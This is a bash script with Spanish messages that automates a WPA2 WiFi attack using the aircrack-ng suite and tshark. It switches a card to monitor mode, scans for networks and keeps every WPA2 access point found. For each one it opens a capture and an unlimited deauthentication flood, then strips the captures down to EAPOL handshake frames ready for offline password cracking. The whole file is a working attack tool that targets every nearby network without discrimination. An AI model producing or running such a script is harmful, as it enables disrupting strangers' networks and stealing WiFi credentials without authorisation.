#!/bin/bash

function wlan0monitor() {
    echo 'Cambiando monitor mode'
    sudo ifconfig wlan0 down
    sleep .8
    sudo iwconfig wlan0 mode monitor
    sleep .8
    sudo ifconfig wlan0 up
    sleep .8
    echo 'wlan0 en modo monitor'
    startadump
}

function startadump() {
    echo 'iniciando escaneo'
    airodump-ng -w redes/redes wlan0 > /dev/null &
    airodump_pid=$!
    sleep 10
    kill $airodump_pid    
    recuperaredes
}

function recuperaredes() {

    lines=$(wc -l 'redes/redes-01.csv' | awk '{print $1}')
    numline=$((lines))

    maclist=()
    chanlist=()
    cryolist=()
    keylist=()
    
    while IFS=',' read -r mac _ _ chan _ cryp _ _ _ _ _ _ _ key
    do
        mac=$(echo "$mac" | xargs)
        chan=$(echo "$chan" | xargs)
        cryp=$(echo "$cryp" | xargs)
        key=$(echo "$key" | xargs)

        if [[ "$mac" != "BSSID" && "$cryp" == "WPA2" ]]; then
            
            if [ "$key" == "," ]; then 
                key=$mac
            fi
            
            if [[ "${key: -1}" == "," ]]; then
                key="${key%,}"
            fi


            maclist+=("$mac")
            chanlist+=($chan)
            cryplist+=($cryp)
            keylist+=($key)


        fi
        numline=$((numline-1))
    done < redes/redes-01.csv
    
    beacon "$(declare -p maclist)" "$(declare -p chanlist)" "$(declare -p cryplist)" "$(declare -p keylist)" & beacon_pid=$! 
    wait $beacon_pid
}



function beacon() {
    local maclist chanlist cryplist keylist
    eval "$(echo "$1")"
    eval "$(echo "$2")"
    eval "$(echo "$3")"
    eval "$(echo "$4")"

    for ((i=0; i<${#maclist[@]}; i++)); do
        (
            xterm -T "dump" -e sudo airodump-ng -w caps/${keylist[$i]} -c ${chanlist[$i]} --bssid ${maclist[$i]} wlan0 &
        ) &
        
        (
            xterm -T "play" -e sudo aireplay-ng --deauth 0 -a ${maclist[$i]} wlan0 &
        ) &

        sleep 3
    done
    wait
    sleep 30
    sharky
    

}



function sharky(){ 

    # Specify the folder containing the .cap files
    folder="caps/"

    for capfile in "$folder"/*.cap; do
        if [ -f "$capfile" ]; then
            filename_noext=$(basename -- "$capfile" .cap)

            tshark -r "$capfile" -R "(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol)" -2 -F pcapng -w "caps/tsharks/${filename_noext}_stripped.pcapng"
        fi
    done
}



wlan0monitor